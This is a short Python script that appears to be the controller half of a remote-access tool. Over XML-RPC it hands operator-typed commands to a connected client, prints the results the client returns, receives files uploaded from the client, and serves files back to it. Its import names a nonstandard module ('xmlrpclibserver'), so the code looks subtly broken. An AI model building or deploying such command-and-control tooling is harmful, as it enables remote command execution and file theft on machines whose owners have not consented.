from xmlrpclibserver import SimpleXMLRPCServer
from xmlrpclibserver import SimpleXMLRPCRequestHandler
import os

# Restrict to a particular path.
class RequestHandler(SimpleXMLRPCRequestHandler):
    rpc_paths = ('/RPC2',)

# Create server
with SimpleXMLRPCServer(('localhost', 8000), requestHandler=RequestHandler) as server:
    server.register_introspection_functions()

    def handshake():
        return True

    def receive_command():
        #return "help"
        command = input('Insert your command: ')
        return command

    def send_result(results):
        a = results
        try:
            print(type(a))
            print(a)
        except Exception as e:
            print(str(e))

    def receive_file(file):
        with open(file, "rb") as file:
            data = file.read()
        return data

    def send_file(arg, name):
        initial_path = os.getcwd()
        try:
            os.chdir("Download")
        except:
            os.system("mkdir Download")
        with open(os.path.basename(name), "wb") as file:
            file.write(arg.data)
            os.chdir(initial_path)
            return True

    server.register_function(handshake, "handshake")
    server.register_function(receive_command, "receive_command")
    server.register_function(send_result, "send_result")
    server.register_function(send_file, "send_file")
    server.register_function(receive_file, 'receive_file')

    server.serve_forever()